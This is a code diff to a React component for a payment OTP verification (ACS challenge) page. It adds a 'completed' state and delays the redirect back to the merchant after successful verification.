@@ -32,7 +32,7 @@ export default function AcsChallengePage() {
   const [otpResendNotice, setOtpResendNotice] = useState(false);
   const [otpResendCooldown, setOtpResendCooldown] = useState(0);
   const [otpResendLoading, setOtpResendLoading] = useState(false);
-  const [otpState, setOtpState] = useState<'input' | 'checking' | 'failed'>('input');
+  const [otpState, setOtpState] = useState<'input' | 'checking' | 'failed' | 'completed'>('input');
   const [failReason, setFailReason] = useState<string | null>(null);
 
   const goBack = useCallback(
@@ -77,7 +77,9 @@ export default function AcsChallengePage() {
         if (data.fail_reason) setFailReason(data.fail_reason);
         const st = String(data.status || '').toLowerCase();
         if (st === 'completed') {
-          goBack('completed');
+          // Only now leave Verify → show redirect, then return to merchant
+          setOtpState('completed');
+          window.setTimeout(() => goBack('completed'), 900);
           return;
         }
         if (st === 'failed' || st === 'refunded' || st === 'suspended') {
@@ -87,6 +89,7 @@ export default function AcsChallengePage() {
           }
         }
         if (st === 'retry_otp') {
+          // Wrong code: stay on Verify with error — never redirect page first
           setOtpState('input');
           setOtpRetryNotice(true);
         }
